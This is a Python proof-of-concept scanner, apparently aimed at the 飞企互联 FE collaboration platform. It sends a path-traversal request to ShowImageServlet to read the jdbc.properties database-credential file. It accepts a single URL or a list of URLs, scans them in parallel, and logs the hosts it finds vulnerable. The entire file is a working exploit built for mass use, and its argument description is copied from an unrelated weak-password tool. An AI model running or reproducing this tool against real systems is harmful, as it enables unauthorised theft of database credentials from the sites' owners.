# -*- coding: utf-8 -*-
import argparse
import sys
import requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """


███████╗ ██████╗ ██╗  ██╗██╗         ███████╗███████╗    ██████╗  ██████╗  ██████╗
██╔════╝██╔═══██╗██║  ██║██║         ██╔════╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
█████╗  ██║   ██║███████║██║         █████╗  █████╗      ██████╔╝██║   ██║██║     
██╔══╝  ██║▄▄ ██║██╔══██║██║         ██╔══╝  ██╔══╝      ██╔═══╝ ██║   ██║██║     
██║     ╚██████╔╝██║  ██║███████╗    ██║     ███████╗    ██║     ╚██████╔╝╚██████╗
╚═╝      ╚══▀▀═╝ ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚══════╝    ╚═╝      ╚═════╝  ╚═════╝
                                                                                  

                                        tag:  this is a  飞企互联FE协作平台文件读取 poc                                       
                                        @version: 1.0.0   @author: bob           
"""
    print(test)


def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",


    }

    url = target + "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
    try:
        response = requests.get(url,headers=headers,verify=False,timeout=5)
        if response.status_code == 200:
            print(f"[+]{target} is valuable")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[+]{target} is not valuable")
    except:
        print(f"[*] {target} error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))

        mp = Pool(10)  # 创建一个拥有20个线程的线程池
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
